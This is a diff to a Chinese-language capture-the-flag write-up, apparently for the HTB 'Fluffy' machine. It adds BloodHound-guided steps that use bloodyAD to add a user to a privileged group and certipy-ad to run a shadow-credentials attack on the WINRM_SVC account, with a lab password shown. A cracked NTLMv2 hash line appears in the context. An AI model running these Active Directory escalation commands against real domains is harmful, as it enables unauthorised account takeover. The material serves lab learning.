@@ -46,3 +46,16 @@ p.agila::FLUFFY:2e389d9803b7cdde:C511A65FED5D202381EED81633E9B5D6:01010000000000
 john爆破
 ![](attachments/Pasted%20image%2020250906165239.png)
 
+经过bloodhound分析后将`p.agila`添加到组`SERVICE ACCOUNTS`中 对 `ca_svc`、`ldap_svc`、`winrm_svc` 等账户有 `GenericWrite` 权限
+
+```bash
+bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila 
+```
+
+![](attachments/Pasted%20image%2020250907104912.png)添加影子证书
+
+```bash
+certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'  
+```
+
+![](attachments/Pasted%20image%2020250907105143.png)
